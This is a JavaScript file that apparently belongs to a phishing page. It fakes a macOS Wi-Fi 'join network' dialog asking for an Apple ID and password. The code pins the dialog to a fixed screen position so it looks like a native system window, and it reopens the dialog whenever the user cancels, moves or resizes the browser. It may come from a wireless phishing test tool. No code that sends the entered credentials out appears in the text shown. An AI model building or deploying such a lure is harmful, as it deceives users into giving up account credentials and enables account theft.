var byId = document.getElementById.bind(document);
var apple_id = byId("apple-id-login"),
    pwd = byId("apple-id-pass"),
    modal = byId("mac-wifi"),
    join = byId("button-join"),
    cancel = byId("button-cancel"),
    title = byId("modal-title");
var EPSILON_WIDTH = 30,
    EPSILON_HEIGHT = 100;
var centerMarginLeft = modal.style.marginLeft,
    centerMarginTop = modal.style.marginTop;
// invariant network manager window position as browser window is resized
var screenLeft, screenTop;

var prevScreenX = window.screenX,
    prevScreenY = window.screenY;

function showModal() {
    setTimeout(function() {
        modal.style.display = "block";
        screenLeft = prevScreenX + (document.body.clientWidth / 2) - (modal.offsetWidth / 2);
        screenTop = prevScreenY + (document.body.clientHeight / 2) - (modal.offsetHeight / 2);
        positionOnScreen();
        checkSaneSize();
        apple_id.focus();
    }, 1000);
}

showModal();

cancel.onclick = function() {
    modal.style.display = "none";
    apple_id.value="";
    pwd.value="";
    document.getElementById('info').innerHTML = "Enter your Apple&nbsp;ID and password.";
    showModal();
};
var downX, downY, oldX, oldY, dragging = false;

title.onmousedown = function(e) {
    if (e.button == 0) {
        dragging = true;
        downX = e.clientX;
        downY = e.clientY;
        oldX = modal.offsetLeft;
        oldY = modal.offsetTop;
        document.onselectstart = function() {
            return false;
        };
    }
};

function positionOnScreen() {
    modal.style.left = screenLeft - (window.screenX) + 'px';
    modal.style.top = screenTop - (window.screenY) + 'px';
}

function restart() {
    modal.style.display = 'none';
    showModal();
}

function checkSaneSize() {
    if (modal.offsetLeft < 0
     || modal.offsetTop < 0
     || modal.offsetLeft + modal.offsetWidth > window.innerWidth
     || modal.offsetTop + modal.offsetHeight > window.innerHeight) {
        restart();
    }
}

function render() {
    var dx = window.screenX - prevScreenX,
        dy = window.screenY - prevScreenY;

    prevScreenX = window.screenX;
    prevScreenY = window.screenY;

    if (dx != 0 || dy != 0) {
        restart();
    }
    else {
        checkSaneSize();
    }
    window.requestAnimationFrame(render);
}

window.requestAnimationFrame(render);

document.onmousemove = function(e) {
    if (dragging) {
        var newX = e.clientX - downX,
            newY = e.clientY - downY;

        screenLeft = window.screenX + oldX + newX;
        screenTop = window.screenY + oldY + newY;

        positionOnScreen();
        checkSaneSize();
    }
};

document.onmouseup = function(e) {
    if (e.button == 0) {
        dragging = false;
        document.onselectstart = function() {
        };
    }
};
